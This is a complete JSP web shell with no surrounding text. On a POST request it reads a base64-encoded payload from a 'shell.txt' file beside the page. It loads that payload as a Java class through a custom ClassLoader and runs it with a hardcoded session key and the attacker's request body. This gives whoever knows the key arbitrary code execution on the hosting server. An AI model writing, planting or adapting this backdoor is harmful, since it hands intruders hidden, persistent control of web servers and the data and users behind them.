<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*,java.nio.file.*,java.nio.charset.*"%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}
public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
<%if (request.getMethod().equals("POST")){
String filename =  new java.io.File(application.getRealPath(request.getRequestURI())).getParent() + "\\shell.txt";
byte[] bytes = Files.readAllBytes(Paths.get(filename));
String content = new String(bytes, StandardCharsets.UTF_8);

String k="0dfeb233de040de5";
session.putValue("u",k);
String p=request.getReader().readLine();
ArrayList<Object> t=new ArrayList<Object>();
t.add(k);
t.add(p);
t.add(pageContext);
t.add(this.getClass().getClassLoader());
new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(content)).newInstance().equals(t);}
%>